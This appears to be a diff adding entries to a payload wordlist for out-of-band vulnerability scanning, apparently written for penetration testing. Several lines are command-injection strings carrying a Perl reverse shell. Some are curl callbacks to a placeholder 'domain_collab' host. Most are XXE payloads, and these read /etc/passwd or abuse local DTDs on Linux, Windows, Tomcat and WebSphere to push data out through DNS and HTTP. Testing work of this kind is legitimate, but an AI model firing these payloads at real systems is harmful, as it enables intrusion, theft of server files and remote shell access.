+&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > vps_ip:80
+echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
+| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
+&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cx xmlns:xsi\u003d\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation\u003d\"http://xxe-xsi-schemalocation.domain_collab/\"/\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003dhttp://domain_collab\"\u003e]\u003e\u003cfoo\u003e\u0026xxe;\u003c/foo\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cx xmlns:xsi\u003d\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation\u003d\"http://xxe-xsi-nonamespaceschemalocation.domain_collab/\"/\u003e"
+curl http://domain_collab/.testing/rce_vuln.txt ||`curl https://domain_collab/.testing/rce_vuln.txt` #' |curl https://domain_collab/.testing/rce_vuln.txt||`curl https://domain_collab/.testing/rce_vuln.txt` #\" |curl https://domain_collab/.testing/rce_vuln.txt
+ curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://domain_collab/.testing/rce_vuln.txt` #' |curl https://domain_collab/.testing/rce_vuln.txt||`curl https://domain_collab/.testing/rce_vuln.txt` #\" |curl https://domain_collab/.testing/rce_vuln.txt
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cxs:schema xmlns:xs\u003d\"http://www.w3.org/2001/XMLSchema\"\u003e\u003cxs:import namespace\u003d\"http://xxe-xsimport-namespace.domain_collab/\"/\u003e\u003c/xs:schema\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cxs:schema xmlns:xs\u003d\"http://www.w3.org/2001/XMLSchema\"\u003e\u003cxs:include namespace\u003d\"http://xxe-xsinclude-namespace.domain_collab/\"/\u003e\u003c/xs:schema\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cxs:schema xmlns:xs\u003d\"http://www.w3.org/2001/XMLSchema\"\u003e\u003cxs:import schemaLocation\u003d\"http://xxe-xsimport-schemalocation.domain_collab/\"/\u003e\u003c/xs:schema\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003cxs:schema xmlns:xs\u003d\"http://www.w3.org/2001/XMLSchema\"\u003e\u003cxs:include schemaLocation\u003d\"http://xxe-xsinclude-schemalocation.domain_collab/\"/\u003e\u003c/xs:schema\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY \u003e\u003c!ENTITY % xxe SYSTEM \"file:///etc/passwd\" \u003e\u003c!ENTITY extract SYSTEM \"http://domain_collab/?%xxe;\"\u003e]\u003e\u003cfoo\u003e\u0026extract;\u003c/foo\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"\u003e\u003c!ENTITY % ISOamsa \u0027 \u003c!ENTITY \u0026#x25; file \"dns-exfil-5\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE doc [\u003c!ENTITY % dtd SYSTEM \"http://domain_collab\"\u003e %dtd;]\u003cfeatures name\u003d\"my-features\" xmlns\u003d\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi\u003d\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation\u003d\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"\u003e\u003cfeature name\u003d\"deployer\" version\u003d\"2.0\" install\u003d\"auto\"\u003e\u003c/feature\u003e\u003c/features\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"\u003e\u003c!ENTITY % ISOamsa \u0027 \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-5.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd\"\u003e \u003c!ENTITY % array-dtd \u0027 \u003c!ENTITY \u0026#x25; file \"dns-exfil-22\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd\"\u003e \u003c!ENTITY % paramlist-dtd \u0027 \u003c!ENTITY \u0026#x25; file \"dns-exfil-21\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgda-5.0/dtd/libgda-paramlist.dtd\"\u003e \u003c!ENTITY % array-dtd \u0027 \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-22.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgweather/locations.dtd\"\u003e \u003c!ENTITY % name \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-20\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"\u003e \u003c!ENTITY % constant \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-10\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgda-5.0/dtd/libgda-server-operation.dtd\"\u003e \u003c!ENTITY % paramlist-dtd \u0027 \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-21.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"\u003e \u003c!ENTITY % CIMName \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-1\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\wmi20.dtd\"\u003e \u003c!ENTITY % CIMName \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-2\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/libgweather/locations.dtd\"\u003e \u003c!ENTITY % name \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-20.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/nmap/nmap.dtd\"\u003e \u003c!ENTITY % attr_numeric \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-18\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/boostbook/dtd/boostbook.dtd\"\u003e \u003c!ENTITY % boost.common.attrib \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-15\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"\u003e \u003c!ENTITY % constant \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-10.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd\"\u003e \u003c!ENTITY % xs-datatypes \u0027 \u003c!ENTITY \u0026#x25; file \"dns-exfil-26\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd\"\u003e \u003c!ENTITY % n.InProceedings \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-14\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/dblatex/schema/dblatex-config.dtd\"\u003e \u003c!ENTITY % attlist.modname \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-24\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/docutils/docutils.dtd\"\u003e \u003c!ENTITY % measure \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-23\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"\u003e \u003c!ENTITY % CIMName \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-1.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\wmi20.dtd\"\u003e \u003c!ENTITY % CIMName \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-2.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/gtksourceview-4/language-specs/language.dtd\"\u003e \u003c!ENTITY % itemattrs \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-13\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/liteide/liteeditor/kate/language.dtd\"\u003e \u003c!ENTITY % commonAttributes \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-19\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\xwizard.dtd\"\u003e\u003c!ENTITY % onerrortypes \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-4\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd\"\u003e \u003c!ENTITY % condition \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-9\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/nmap/nmap.dtd\"\u003e \u003c!ENTITY % attr_numeric \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-18.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"\u003e \u003c!ENTITY % url.attribute.set \u0027\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-8\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/boostbook/dtd/boostbook.dtd\"\u003e \u003c!ENTITY % boost.common.attrib \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-15.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd\"\u003e \u003c!ENTITY % xs-datatypes \u0027 \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-26.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/struts/struts-config_1_1.dtd\"\u003e \u003c!ENTITY % AttributeName \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-11\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/lib/gap/pkg/GAPDoc-1.6.2/bibxmlext.dtd\"\u003e \u003c!ENTITY % n.InProceedings \u0027aaa)\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-14.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa (bb\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///usr/share/dblatex/schema/dblatex-config.dtd\"\u003e \u003c!ENTITY % attlist.modname \u0027\u003e \u003c!ENTITY \u0026#x25; file SYSTEM \"http://exfil-xxe-payload-24.domain_collab\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;file:///abcxyz/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ELEMENT aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
+\u003c?xml version\u003d\"1.0\" encoding\u003d\"utf-8\" standalone\u003d\"no\" ?\u003e\u003c!DOCTYPE message [ \u003c!ENTITY % local_dtd SYSTEM \"file:///C:\\Program Files (x86)\\Lotus\\Notes\\domino.dtd\"\u003e\u003c!ENTITY % boolean \u0027(aa) #IMPLIED\u003e \u003c!ENTITY \u0026#x25; file \"dns-exfil-3\"\u003e \u003c!ENTITY \u0026#x25; eval \"\u003c!ENTITY \u0026#x26;#x25; error SYSTEM \u0026#x27;http://\u0026#x25;file;.domain_collab/\u0026#x25;file;\u0026#x27;\u003e\"\u003e \u0026#x25;eval; \u0026#x25;error; \u003c!ATTLIST attxx aa \"bb\"\u0027\u003e %local_dtd;]\u003e\u003cmessage\u003e\u003c/message\u003e"
